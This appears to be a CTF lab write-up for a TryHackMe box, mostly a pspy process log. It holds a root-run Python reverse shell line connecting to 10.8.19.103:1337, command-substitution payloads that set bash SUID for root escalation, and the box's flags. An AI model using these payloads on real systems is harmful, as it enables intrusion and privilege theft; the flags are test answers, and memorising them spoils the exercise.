2023/01/13 18:50:01 CMD: UID=0    PID=18329  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18330  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18331  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18334  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18335  | /usr/bin/sh -c echo Punched in at 16:13 
2023/01/13 18:50:01 CMD: UID=0    PID=18336  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18338  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18346  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18348  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18350  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18352  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18356  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18358  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18360  | /usr/bin/sh -c echo Punched in at 16:38 
2023/01/13 18:50:01 CMD: UID=0    PID=18361  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18363  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18364  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18366  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18367  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18368  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18369  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18370  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18371  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18372  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18373  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18375  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18377  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18379  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18380  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18381  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18382  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18383  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18384  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18385  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18388  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18391  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18392  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18393  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18394  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18396  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18397  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18399  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18400  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18401  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18402  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18403  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18405  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18406  | /usr/bin/sh -c echo Punched in at 17:24 
2023/01/13 18:50:01 CMD: UID=0    PID=18407  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18408  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18409  | /usr/bin/sh -c echo Punched in at 17:27 
2023/01/13 18:50:01 CMD: UID=0    PID=18411  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18412  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18413  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18415  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18416  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18417  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18418  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18419  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18421  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18422  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18424  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18428  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18429  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18430  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18432  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18433  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18434  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18435  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18436  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18437  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18439  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18441  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18442  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18443  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18444  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18445  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18446  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18447  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18449  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18450  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18451  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18453  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18454  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18456  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18458  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18459  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18461  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18465  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18466  | /usr/bin/sh -c echo Punched in at 18:24 
2023/01/13 18:50:01 CMD: UID=0    PID=18467  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18469  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18470  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18471  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18473  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18474  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18475  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18477  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18478  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18479  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18481  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18482  | /usr/bin/sh -c echo Punched in at 18:37 
2023/01/13 18:50:01 CMD: UID=0    PID=18483  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18484  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18485  | /usr/bin/sh -c echo Punched in at 18:40 
2023/01/13 18:50:01 CMD: UID=0    PID=18487  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:01 CMD: UID=0    PID=18488  | /usr/bin/sh -c echo Punched in at 18:42 
2023/01/13 18:50:01 CMD: UID=0    PID=18489  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18490  | 
2023/01/13 18:50:01 CMD: UID=0    PID=18492  | /usr/bin/sh -c echo `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`                                                                                                                             
2023/01/13 18:50:01 CMD: UID=0    PID=18491  | /usr/bin/sh -c echo `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`                                                                                                                             
2023/01/13 18:50:02 CMD: UID=0    PID=18493  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:02 CMD: UID=0    PID=18496  | 
2023/01/13 18:50:02 CMD: UID=0    PID=18498  | /usr/bin/bash /root/check_in.sh 
2023/01/13 18:50:02 CMD: UID=0    PID=18499  | 

$(chmod u+s /usr/bin/bash) 

or

`chmod +s /usr/bin/bash` 


The command `chmod u+s /usr/bin/bash` and `chmod +s /usr/bin/bash` are very similar in their effect, both are used to make the file /usr/bin/bash a set-user-ID program, meaning that when the file is executed, it runs with the effective user ID of the file's owner, rather than the user who is executing the file.

The main difference is the letter 'u' in the first command, this specify that only the owner (user) will be granted with the set-user-ID permission, while in the second command the '+' symbol means that all users (owner, group, and others) will be granted with the set-user-ID permission.

adrian@brute:~$ echo '`chmod +s /usr/bin/bash`' > punch_in
adrian@brute:~$ /usr/bin/bash -p
bash-5.0# whoami
root

adrian@brute:~$ echo '$(chmod u+s /usr/bin/bash)' > punch_in
adrian@brute:~$ /usr/bin/bash -p
bash-5.0# whoami
root




```

![[Pasted image 20230113112319.png]]

![[Pasted image 20230113122130.png]]

What is the user flag?  

*THM{PoI$0n_tH@t_L0g}*

What is the root flag?

*THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}*


[[Content Security Policy]]